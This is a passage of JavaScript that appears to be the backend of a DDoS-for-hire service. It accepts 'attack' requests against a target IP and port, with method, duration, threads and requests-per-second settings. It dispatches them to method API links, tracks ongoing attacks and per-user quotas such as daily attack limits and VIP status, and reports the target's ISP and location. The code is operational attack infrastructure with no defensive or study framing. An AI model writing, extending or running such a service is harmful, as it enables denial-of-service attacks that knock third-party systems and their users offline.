    if (!userBypass && ongoing >= GLOBAL_API_SLOTS) return makePolishedError(`api slots are full (${ongoing}/${GLOBAL_API_SLOTS}), wait until slots are free`, 503, { hint: 'Try again once one of the active slots becomes available.' });

    await Vault.addLog(env, record);
    await Vault.addOngoingAttack(env, record);

    const apiLinkExecutions = await fanOutMethodApiLinks(methodMeta, record);

    const attacks_remaining = Math.max(0, Number(user.max_daily_attacks || 0) - Number(todays || 0));
    const ongoing_now = await Vault.countOngoing(env);
    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
    const responseBody = {
      error: false,
      message: 'attack accepted',
      data: {
        Target: record.target,
        Port: Number(record.port),
        Method_Used: record.method,
        Time_Used: Number(record.duration),
        Len: '1',
        Threads: Number(record.threads || 0),
        RPS: Number(record.rps || 0),
        Geo: record.geo || null,
        target_asn: ipinfo.as || ipinfo.org || null,
        target_city: ipinfo.city || null,
        target_country: ipinfo.country || null,
        target_country_code: ipinfo.countryCode || null,
        target_isp: ipinfo.isp || null,
        target_org: ipinfo.org || null,
        target_region: ipinfo.regionName || ipinfo.region || null,
        target_timezone: ipinfo.timezone || null,
        target_zip: ipinfo.zip || null,
        Username: user.username || qv.username || 'anon',
        Max_Time: Number(user.max_time || 60),
        Min_Time: Number(user.min_time || 30),
        Max_Concurrents: Number(user.max_concurrents || user.concurrents || 1),
        Method_Max_Slots: Number(methodMeta?.max_slots || 0),
        Method_Active_Slots: Number(await Vault.countMethodOngoing(env, record.method)),
        Cooldown: Number(user.cooldown || 10),
        Max_Daily_Attacks: Number(user.max_daily_attacks || 0),
        Attacks_Remaining: attacks_remaining,
        Global_API_Slots: `${ongoing_now}/${GLOBAL_API_SLOTS}`,
        Bypass_Slots: Boolean(user.bypass_slots || 0),
        Holder_Status: Boolean(user.holder),
        Vip_Status: Boolean(user.vip),
        Api_Status: Boolean(user.api_access),
        Admin_Status: Boolean(user.admin),
        service_name: serviceName
      }
    };

    return jsonResponse(responseBody, 200, { service: serviceName });
  }

  if (endpoint === 'stop') {
    return jsonResponse({ error: false, kill_id: 1 });
  }

  return routeNotFound();
}
